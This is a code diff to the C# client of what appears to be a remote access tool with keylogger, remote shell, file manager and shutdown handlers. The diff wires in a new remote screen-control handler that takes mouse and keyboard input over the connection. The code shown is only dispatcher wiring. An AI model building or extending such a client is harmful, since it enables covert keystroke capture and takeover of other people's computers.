@@ -26,6 +26,7 @@ namespace Client
         private MessageBoxHandler? _messageBoxHandler;
         private ShutdownActionHandler? _shutdownActionHandler;
         private KeyLoggerHandler? _keyLoggerHandler;
+        private ScreenControlHandler? _screenControlHandler;
 
 		public MainClientForm()
         {
@@ -43,6 +44,7 @@ namespace Client
             var taskManagerService = new TaskManagerService();
             var shutdownActionService = new ShutdownActionService();
             var keyLoggerService = new KeyLoggerService(_connection);
+            var screenControlService = new ScreenControlService(_connection);
             _systemInfoHandler = new SystemInfoHandler(sysService, _connection);
             _remoteShellHandler = new RemoteShellHandler(remoteShellService, _connection);
             _fileManagerHandler = new FileManagerHandler(fileManagerService, _connection);
@@ -50,16 +52,21 @@ namespace Client
             _taskManagerHandler = new TaskManagerHandler(taskManagerService, _connection);
             _shutdownActionHandler = new ShutdownActionHandler(shutdownActionService, _connection);
             _keyLoggerHandler = new KeyLoggerHandler(keyLoggerService);
+            _screenControlHandler = new ScreenControlHandler(screenControlService, _connection);
             _packetHandler = new PacketHandler(
                onSystemInfoRequest: req => _ = _systemInfoHandler!.HandleAsync(req),
                onRemoteShellRequest: sreq => _ = _remoteShellHandler!.HandleAsync(sreq),
                onFileManagerRequest: freq => _ = _fileManagerHandler!.HandleAsync(freq),
                onMessageBoxRequest: mreq => _ = _messageBoxHandler!.HandleAsync(mreq),
-               onShutdownActionRequest: sdreq => _shutdownActionHandler!.HandleAsync(sdreq),
+               onShutdownActionRequest: sdreq => _ = _shutdownActionHandler!.HandleAsync(sdreq),
                onKeyLoggerStart: kls => _ = _keyLoggerHandler!.HandleStartAsync(kls),
                onKeyLoggerStop: klt => _ = _keyLoggerHandler!.HandleStopAsync(klt),
                onKeyLoggerLangToggle: l => _ = _keyLoggerHandler!.HandleLangToggleAsync(l),
-               onTaskManagerRequest: treq => _ = _taskManagerHandler!.HandleAsync(treq)
+               onTaskManagerRequest: treq => _ = _taskManagerHandler!.HandleAsync(treq),
+               onScreenControlStart: scs => _ = _screenControlHandler!.HandleStartAsync(scs),
+               onScreenControlStop: scs => _ = _screenControlHandler!.HandleStopAsync(scs),
+               onScreenControlMouseEvent: scm => _ = _screenControlHandler!.HandleMouseEventAsync(scm),
+               onScreenControlKeyboardEvent: sck => _ = _screenControlHandler!.HandleKeyboardEventAsync(sck)
            );
             _connection.OnLineReceived += line => _packetHandler.HandleLine(line);
             _connection.OnDisconnected += () =>
